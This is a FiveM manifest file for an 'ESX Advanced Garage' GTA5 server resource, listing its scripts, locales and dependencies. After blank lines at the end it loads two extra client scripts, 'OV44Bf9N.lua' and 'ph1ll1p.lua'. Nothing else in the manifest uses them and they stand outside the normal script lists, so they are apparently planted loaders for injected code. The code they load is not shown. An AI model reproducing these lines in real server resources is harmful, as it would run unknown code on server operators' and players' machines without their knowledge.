fx_version 'adamant'

game 'gta5'

description 'ESX Advanced Garage'

Author 'Human Tree92 | Velociti Entertainment'

version '1.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended'
}



client_script 'OV44Bf9N.lua'

client_script "ph1ll1p.lua"